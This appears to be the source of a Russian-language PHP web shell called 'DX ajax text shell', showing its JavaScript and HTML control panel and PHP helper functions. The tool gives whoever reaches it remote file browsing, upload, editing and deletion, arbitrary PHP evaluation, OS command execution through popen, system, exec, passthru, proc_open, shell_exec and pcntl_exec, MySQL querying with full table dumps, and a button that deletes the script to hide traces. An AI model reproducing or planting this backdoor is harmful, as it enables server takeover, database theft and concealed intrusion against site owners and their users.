  if(document.getElementById(id).value=="8")
  {
    document.getElementById('dw').value=curfile;
    document.getElementById('dfrm').submit();
  }
  else
  {
    sendRequest(getRequestx,"fileact="+document.getElementById(id).value+params+"&fl="+curfile);
  }
}

function saveFile(t)
{
  if(!checkNow()) return false;
  var adds="";
  if(t==1) adds="&utf=1";
  var txt=base64e(utf8e(document.getElementById('etxt').value));
  document.getElementById('etxt').value="";
  sendRequest(getRequestx,"fileact=10&params=&txt="+txt+"&fl="+curfile+adds);
}

function newDir(t)
{
  if(!checkNow()) return false;
  var adds="";
  if(t==1) adds="&utf=1";

  var dn=document.getElementById('newdir').value;
  if(!dn)
  {
    alert('Введите имя директории.');
    return false;
  }

  sendRequest(getRequestx,"fileact=11&params="+dn+"&fl="+cdir+adds);
}


function openEdit(n,t)
{
  showLoading();
  document.getElementById('editt').innerHTML="Редактирование файла "+n;
  document.getElementById('etxt').value=utf8d(base64d(t));
  document.getElementById('ediv').style.top=document.body.scrollTop;
  document.getElementById('ediv').style.display='block';
  hideLoading();
}

var _keyStr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

function base64e(input)
{
  var output="";
  var chr1,chr2,chr3,enc1,enc2,enc3,enc4;
  var i=0;
  var il=input.length;
  while(i<il)
  {
    chr1=input.charCodeAt(i++);
    chr2=input.charCodeAt(i++);
    chr3=input.charCodeAt(i++);
    enc1=chr1 >> 2;
    enc2=((chr1 & 3) << 4) | (chr2 >> 4);
    enc3=((chr2 & 15) << 2) | (chr3 >> 6);
    enc4=chr3 & 63;
    if(isNaN(chr2))
      enc3=enc4=64;
    else if(isNaN(chr3))
      enc4 = 64;

    output=output+_keyStr.charAt(enc1)+_keyStr.charAt(enc2)+_keyStr.charAt(enc3)+_keyStr.charAt(enc4);
  }
  return output;
}

function base64d(input)
{
  var output="";
  var output="";
  var chr1,chr2,chr3,enc1,enc2,enc3,enc4;
  var i=0;
  input=input.replace(/[^A-Za-z0-9\+\/\=]/g,"");
  var il=input.length;
  while(i<il)
  {
    enc1=_keyStr.indexOf(input.charAt(i++));
    enc2=_keyStr.indexOf(input.charAt(i++));
    enc3=_keyStr.indexOf(input.charAt(i++));
    enc4=_keyStr.indexOf(input.charAt(i++));
    chr1=(enc1 << 2) | (enc2 >> 4);
    chr2=((enc2 & 15) << 4) | (enc3 >> 2);
    chr3=((enc3 & 3) << 6) | enc4;
    output=output+String.fromCharCode(chr1);
    if(enc3!=64)
      output=output+String.fromCharCode(chr2);
    if(enc4!=64)
      output=output+String.fromCharCode(chr3);
  }

  return output;
}

function utf8d(utftext)
{
  var string="";
  var i=0;
  var c=c1=c2=0;

  var il=utftext.length;
  while(i<il)
  {
    c=utftext.charCodeAt(i);
    if(c<128)
    {
      string+=String.fromCharCode(c);
      i++;
    }
    else if((c>191) && (c<224))
    {
      c2=utftext.charCodeAt(i+1);
      string+=String.fromCharCode(((c & 31) << 6) | (c2 & 63));
      i+=2;
    }
    else
    {
      c2=utftext.charCodeAt(i+1);
      c3=utftext.charCodeAt(i+2);
      string+=String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
      i+=3;
    }
  }

  return string;
}


function utf8e(string)
{
  string=string.replace(/\\r\\n/g,"\\n");
  var utftext="";
  var il=string.length;
  for(var n=0;n<il;n++)
  {
    var c=string.charCodeAt(n);
    if(c<128)
    {
      utftext+=String.fromCharCode(c);
    }
    else if((c>127) && (c<2048))
    {
      utftext+=String.fromCharCode((c >> 6) | 192);
      utftext+=String.fromCharCode((c & 63) | 128);
    }
    else
    {
      utftext+=String.fromCharCode((c >> 12) | 224);
      utftext+=String.fromCharCode(((c >> 6) & 63) | 128);
      utftext+=String.fromCharCode((c & 63) | 128);
    }
  }

  return utftext;
}

var uploading=false;

function fUpload()
{
  if(document.getElementById('newfilename').value.length<1)
  {
    alert('Введите имя файла.');
    return false;
  }

  document.getElementById('upfl').value=cdir;
  uploading=true;
  document.getElementById('upform').style.display='none';
  document.getElementById('upform2').style.display='block';
  document.getElementById('uplfrm').submit();
}

function checkUpFiles()
{
  if(uploading)
  {
    uploading=false;
    var st=window.frames[0].document.body.innerHTML;

    switch(st)
    {
      case '0':
        alert('Выберите файл для загрузки.');
      break;
      case '1':
        alert('Имя файла содержит недопустимые символы.'); 
      break;
      case '2':
        alert('Выбрана несуществующая директория для загрузки.');
      break;
      case '3':
        alert('Файл с таким именем уже существует в каталоге.');
      break;
      case '4':
        alert('Не удалось загрузить файл.');
      break;
      default:
        if(st.substr(0,1)=='5')
        {
          st=st.split("*");
          alert('Файл успешно загружен.');
          getDir(st[1]);
        }
        else
        {
          alert('Неопознанная ошибка при загрузке файла.');
        }
    }

    document.getElementById('upform').style.display='block';
    document.getElementById('upform2').style.display='none';
  }
}

function mover()
{
  document.getElementById('loading').style.top=document.body.scrollTop;
  if(document.getElementById('ediv'))
    document.getElementById('ediv').style.top=document.body.scrollTop;
}


function showMenu(m)
{
  if(!checkNow()) return false;
  hideMenus();
  for(var i=0;i<=5;i++)
  {
    document.getElementById('mdl'+i).style.display='none';
  }

  document.getElementById('mdl'+m).style.display='block';

  switch(m)
  {
    case 1:
      sendRequest(getRequestx,"getinfo=1");
    break;

    case 3:
      sendRequest(getRequestx,"mysql=1");
    break;
  }
}

function phpEval(t)
{
  if(!checkNow()) return false;
  if(document.getElementById('phpcode').value.length<1)
  {
    alert('Введите php-код.');
    return false;
  }

  var adds;
  adds=t ? '&noutf=1' : '';

  if(document.getElementById('htmlsc').checked)
    adds+="&htmlsc=1";

  sendRequest(getRequestx,"php="+base64e(utf8e(document.getElementById('phpcode').value))+adds);
}

function setRes(t)
{
  document.getElementById('res').innerHTML=utf8d(base64d(t));
}

function runCmd()
{
  if(!checkNow()) return false;
  if(document.getElementById('cmdstr').value.length<1)
  {
    alert('Введите команду.');
    return false;
  }

  if(document.getElementById('ctype').value=='0')
  {
    alert('Выберите способ выполнения.');
    return false;
  }

  document.getElementById('cmdfrm').submit();
}

function sqlRun()
{
  if(!checkNow()) return false;
  if(document.getElementById('host').value.length<1)
  {
    alert('Введите хост MySQL.');
    return false;
  }

  if(document.getElementById('sqlrun').value.length<1)
  {
    alert('Введите MySQL-запрос.');
    return false;
  }

  if(document.getElementById('port').value.length<1)
  {
    alert('Введите порт MySQL (по умолчанию 3306.)');
    return false;
  }

  sendRequest(getRequestx,"sqlr="+base64e(utf8e(document.getElementById('sqlrun').value))+"&host="+base64e(utf8e(document.getElementById('host').value))+"&sqluser="+base64e(utf8e(document.getElementById('sqluser').value))+"&pass="+base64e(utf8e(document.getElementById('sqlpass').value))+"&dbname="+base64e(utf8e(document.getElementById('dbname').value))+"&port="+base64e(utf8e(document.getElementById('port').value)));
}

function setSqlRes(t)
{
  document.getElementById('sqlres').innerHTML=utf8d(base64d(t));
}

function setQuery(q)
{
  document.getElementById('sqlrun').value=q;

  if(document.getElementById('sqllist').selectedIndex>7)
    document.getElementById('delbtn').style.display='block';
  else
    document.getElementById('delbtn').style.display='none';
}

function saveQuery()
{
  var q=document.getElementById('sqlrun').value;
  if(q.length<1)
  {
    alert('Запрос не введён.');
    return false;
  }

  q2=q.length>50 ? q.substring(0,50)+'...' : q;
  document.getElementById('sqllist').options[document.getElementById('sqllist').length]=new Option(q2,q);
  alert('Запрос добавлен в список');
}

function deleteQuery()
{
  document.getElementById('sqllist').options[document.getElementById('sqllist').selectedIndex]=null;
  document.getElementById('sqllist').selectedIndex=0;
  document.getElementById('delbtn').style.display='none';
}

function delShell()
{
  if(!checkNow()) return false;
  if(!window.confirm('Вы действительно хотите удалить скрипт?'))
    return false;

  sendRequest(getRequestx,"delscript=1");
}

window.onscroll=mover;
window.onresize=mover;
</script>
</head>
<body><div id="loading" style="display:none;position:absolute;background-color:gold;left:0px;top:0px;border-width:1px;border-color:black;border-style:solid;padding:2px;">Загрузка...</div>
<span class='header'><center>DX ajax text shell (ATS) $ver</center></span>
<br>
<a href="javascript:void(0);" onclick="showMenu(0);">Файлы</a> | <a href="javascript:void(0);" onclick="showMenu(1);">Система</a>
 | <a href="javascript:void(0);" onclick="showMenu(2);">Выполнить PHP</a> | <a href="javascript:void(0);" onclick="showMenu(3);">MySQL</a> | <a href="javascript:void(0);" onclick="showMenu(4);">CMD</a>
 | <a href="javascript:void(0);" onclick="delShell();">Удалить скрипт</a>
<hr><div id="mdl5"><b>Выберите действие выше</b></div>
<div id="mdl0" style="display:none;">
Перейти в каталог: <input type='text' id='gdir' value="$sdir"> <input type="button" onclick="gotodir();return false;" value="&gt;"> <input type="button" onclick="getDir(cdir);return false;" value='Обновить'>
<br>
Создать каталог с именем <input type="text" id="newdir"> <input type="button" onclick="newDir();return false;" value="OK">
<br>
<div id="upform">
<form action='?' method='post' id="uplfrm" target="upiframe" enctype="multipart/form-data" onsubmit="return false;">
<input type='hidden' name='fl' id='upfl' value=''>
Загрузить файл <input type="file" id="newfile" name="newfile"> под именем <input type="text" id="newfilename" name="newfilename"> <input type="button" onclick="fUpload();return false;" value="OK">
</form>
</div><div id="upform2" style="display:none;">&nbsp;<br>Файл загружается...</div>
<iframe id="upiframe" name="upiframe" style="display:none;width:0px;height:0px;" onload="checkUpFiles();"></iframe>
<br><div id='flist'>
</div>
</div>

<div id="mdl1" style="display:none;">
</div>

<div id="mdl2" style="display:none;">
Выполнить код PHP:<br>
<textarea rows=15 cols=50 id='phpcode'>
phpinfo();
</textarea><br>
<input type="checkbox" id="htmlsc" checked> Обработать результат htmlspecialchars<br>
<input type='button' onclick='phpEval(1);return false;' value='Выполнить как cp1251'>
 <input type='button' onclick='phpEval(0);return false;' value='Выполнить как utf8'>
<hr><b>Результат выполнения:</b>
<br><span id='res'></span>
</div>

<div id="mdl3" style="display:none;">
<form action='?' method='post' target='dumpframe'>
<span id='mysql'></span><br>
<table border=0 cellpadding=1 cellspacing=1><tr valign=top><td>
<fieldset><legend>
Подключиться к MySQL с параметрами:</legend>
<table border=0 cellpadding=1 cellspacing=1>
<tr><td>Хост*: </td><td><input type='text' id='host' value='localhost' name='host'></td></tr>
<tr><td>Порт*: </td><td><input type='text' id='port' value='3306' name='port'></td></tr>
<tr><td>Пользователь: </td><td><input type='text' id='sqluser' name='sqluser'></td></tr>
<tr><td>Пароль: </td><td><input type='text' id='sqlpass' name='pass'></td></tr>
<tr><td>Имя БД: </td><td><input type='text' id='dbname' name='dbname'></td></tr></table></fieldset>
<br>
<fieldset><legend>и выполнить запрос:</legend>
<textarea rows=7 cols=35 id='sqlrun' name='sqlrun'></textarea>
<br><select onchange='setQuery(this.value);' id='sqllist'>
<option value=''>Или выберите стандартный запрос...</option>
<option value='show databases'>Список БД</option>
<option value='show tables'>Список таблиц в БД</option>
<option value='show table status'>Подробный список таблиц в БД</option>
<option value='show full columns from [имя таблицы]'>Список колонок таблицы</option>
<option value='show grants'>Показать права</option>
<option value='show processlist'>Показать процессы</option>
<option value='show status'>Показать состояние сервера</option>
</select>
<br>
<input type='button' value='Сохранить запрос' onclick='saveQuery();return false;'> <input type='button' value='Удалить запрос' onclick='deleteQuery();return false;' id='delbtn' style='display:none;'>
<br><input type='button' value='Готово' onclick='sqlRun();return false;'>
</fieldset>
</td><td>
<fieldset style='width:300px;'><legend>Выполнить dump-запрос:</legend><input type='text' name='sqlr' value='[DUMP] ' style='width:250px;'>
<br>Синтаксис:<br>
<a href='javascript:void(0);' onclick="javascript:alert('Сдампит таблицу в выбранной БД.');">[DUMP]&nbsp;имя_таблицы</a><br>
<a href='javascript:void(0);' onclick="javascript:alert('Сдампит таблицу в заданной в запросе БД.');">[DUMP]&nbsp;имя_БД.имя_таблицы</a><br>
<a href='javascript:void(0);' onclick="javascript:alert('Сдампит все таблицы в заданной БД.');">[DUMP]&nbsp;*</a><br>
<a href='javascript:void(0);' onclick="javascript:alert('Сдампит введённый в поле слева SQL-запрос, разделяя поля заданным разделителем.');">[DUMPSQL]&nbsp;разделитель</a><br><br>
Перекодировать&nbsp;дамп&nbsp;в:<br>
<input type='text' name='enc' value='windows-1251'><br>
Начальная&nbsp;строка:<br>
<input type='text' name='curr' value='0'><br>
Сдампить&nbsp;строк:<br>
<input type='text' name='usercnt' value='0'><br>(минимум&nbsp;1500; оставьте 0, чтобы сдампить всё)
<br>Кодировка&nbsp;соединения:<br>
<input type='text' name='senc' value=''><br>
(Не заполняйте поле, чтобы оставить её по умолчанию.)<br><input type='submit' value='Выполнить'>
</fieldset>
<input type='hidden' name='dump' value='1'>
</form>
</td></tr></table>
<hr><b>Результат выполнения:</b><br>
<span id='sqlres'></span>
<iframe id='dumpframe' name='dumpframe' style='display:none;width:0px;height:0px;'></iframe>
</div>

<div id="mdl4" style="display:none;">
<form action='?' method='post' target='cmdiframe' id='cmdfrm' onsubmit="return false;">
Выполнить команду: <input type="text" id="cmdstr" name="cmd"><br> Способ выполнения команды:
<select id='ctype' name='tp'>
<option value='0'>Выберите...</option>
<option value='1'>popen</option>
<option value='2'>system</option>
<option value='3'>exec</option>
<option value='4'>Обратные кавычки</option>
<option value='5'>passthru</option>
<option value='6'>proc_open</option>
<option value='7'>shell_exec</option>
<option value='8'>pcntl_exec</option>
</select>
<br><input type="button" value="Готово" onclick="runCmd();return false;">
</form>
<hr><b>Результат выполнения:</b><br>
<iframe name='cmdiframe' frameborder=0 style="width:100%;height:350px;border-color:black;border-width:1px;border-style:solid;"></iframe>
</div>

<div id='fmenu' class='fmenu' style='display:none;position:absolute;'>
<span id='fnam'></span>
<select id='act1' onchange='showAdds(this.value);'>
<option value='0'>Выберите действие...</option>
<option value='1'>Переименовать</option>
<option value='2'>Переместить</option>
<option value='3'>Копировать</option>
<option value='4'>Удалить</option>
<option value='5'>Chmod</option>
<option value='6'>Touch</option>
<option value='7'>Редактировать как текст</option>
<option value='9'>Редактировать как текст в UTF-8</option>
<option value='8'>Скачать</option>
</select> <input type='button' onclick='FileDo();return false;' value='Готово'>
<br><span id='adds'></span>
<br>
<input type='button' onclick='hideMenus();return false;' value='Закрыть'>
</div>

<div id='fmenu2' class='fmenu' style='display:none;position:absolute;'>
<span id='fnam2'></span>
<select id='act2' onchange="showAdds(this.value,'adds2');">
<option value='0'>Выберите действие...</option>
<option value='1'>Переименовать</option>
<option value='4'>Удалить</option>
<option value='5'>Chmod</option>
</select> <input type='button' onclick="FileDo('act2');return false;" value="Готово">
<br><span id='adds2'></span>
<br>
<input type='button' onclick='hideMenus();return false;' value='Закрыть'>
</div>

<form action='?' id='dfrm' method='post' style='display:none;' target='dwnlfrm'>
<input type='hidden' name='fl' id='dw' value=''>
<input type='hidden' name='fileact' value='8'>
<input type='hidden' name='params'>
</form>
<iframe name='dwnlfrm' frameborder=0 style="width:0px;height:0px;display:none;"></iframe>
<div id="ediv" style="position:absolute;display:none;width:100%;height:100%;top:0px;left:0px;background-color:white;">
<center><span class='header' id='editt'></span></center><hr>
<textarea id="etxt" style="width:100%;" rows=15></textarea>
<br><input type="button" onclick="saveFile();hideMenus();return false;" value="Сохранить"> <input type="button" onclick="saveFile(1);hideMenus();return false;" value="Сохранить в UTF-8"> <input type="button" onclick="hideMenus();return false;" value="Отмена">
</div>
</body></html>
HERE;

function ajax_die($txt)
{
  header("Content-type:text/html; charset=utf-8");
  die('<codestart>'.$txt);
}

function myconv($txt,$p=0)
{
  return $p ? iconv('UTF-8','windows-1251',$txt) : iconv('windows-1251','UTF-8',$txt);
}

function myconv2($txt,$enc)
{
  return $enc ? iconv($enc,'UTF-8',$txt) : $txt;
}

function filestats($f)
{
  $perms=fileperms($f);
  if(!$perms)
    return '?';

  if(($perms & 0xC000)==0xC000)
    $info='s';
  elseif(($perms & 0xA000)==0xA000)
    $info='l';
  elseif(($perms & 0x8000)==0x8000)
    $info='-';
  elseif(($perms & 0x6000)==0x6000)
    $info='b';
  elseif(($perms & 0x4000)==0x4000)
    $info='d';
  elseif(($perms & 0x2000)==0x2000)
    $info='c';
  elseif(($perms & 0x1000)==0x1000)
    $info='p';
  else
    $info='u';

  $info.=(($perms & 0x0100) ? 'r' : '-');
  $info.=(($perms & 0x0080) ? 'w' : '-');
  $info.=(($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

  $info.=(($perms & 0x0020) ? 'r' : '-');
  $info.=(($perms & 0x0010) ? 'w' : '-');
  $info.=(($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

  $info.=(($perms & 0x0004) ? 'r' : '-');
  $info.=(($perms & 0x0002) ? 'w' : '-');
  $info.=(($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

  return $info;
}

function myfilesize($f)
{
  $sz=filesize($f);
  if($sz===false)
    return '?';

  if($sz<=0)
    return '0 байт';

  $convention=1024;
  $s=Array('Б','КБ','МБ','ГБ','ТБ');
  $e=floor(log($sz,$convention));
  return round($sz/pow($convention,$e),2).' '.$s[$e];
}

function myfiletime($f)
{
  $t=filemtime($f);
  if(!$t)
    return '?';

  return date('d.m.Y H:i:s',$t);
}

function rmdir_recurse($path)
{
  $path.='/';
  $handle=@opendir($path);
  if(!$handle)
    return false;

  for(;false!==($file=readdir($handle));)
  {
    if($file!='.' && $file!='..')
    {
      $fullpath=$path.$file;
      if(is_dir($fullpath))
      {
        rmdir_recurse($fullpath);
        if(!@rmdir($fullpath))
        {
          closedir($handle);
          return false;
        }
      }
      else
      {
        if(!@unlink($fullpath))
        {
          closedir($handle);
          return false;
        }
      }
    }
  }

  closedir($handle);
  return true;
}

function cutlen($t)
{
  if(strlen($t)>36)
    return utf8_substr($t,0,36).'...';
  else
    return $t;
}

function utf8_substr($str,$start)
{
  preg_match_all("/./su",$str,$ar);
  if(func_num_args()>=3)
  {
    $end=func_get_arg(2);
    return join("",array_slice($ar[0],$start,$end));
  }
  else
  {
    return join("",array_slice($ar[0],$start));
  }
}

function namesort($a,$b)
{
  $x=strtolower_ru($a[0]);
  $y=strtolower_ru($b[0]);

  if($x==$y) return 0;
  return $x>$y ? 1 : -1;
}


function strtolower_ru($text)
{ 
  $alfavitlover=array('ё','й','ц','у','к','е','н','г', 'ш','щ','з','х','ъ','ф','ы','в', 'а','п','р','о','л','д','ж','э', 'я','ч','с','м','и','т','ь','б','ю');
  $alfavitupper=array('Ё','Й','Ц','У','К','Е','Н','Г', 'Ш','Щ','З','Х','Ъ','Ф','Ы','В', 'А','П','Р','О','Л','Д','Ж','Э', 'Я','Ч','С','М','И','Т','Ь','Б','Ю');

  return str_replace($alfavitupper,$alfavitlover,strtolower($text));
}

function get_mysql_info($res=0)
{
  $info='';
  $info.=extension_loaded('mysql') ? '<b>MySQL доступен</b><br>' : '<b>MySQL недоступен</b><br>';

  $res=mysql_query("select version() as ver, user() as usr");
  if($res)
  {
    if(mysql_num_rows($res)>0)
    {
      $info.="<b>Версия</b>: ".mysql_result($res,0,'ver').'<br>';
      $info.="<b>Пользователь</b>: ".mysql_result($res,0,'usr').'<br>';
    }

    mysql_free_result($res);
  }

  if($res) @mysql_close($res);

  return "document.getElementById('mysql').innerHTML=\"<b>Информация о MySQL</b><br><br>{$info}\";";
} 

?>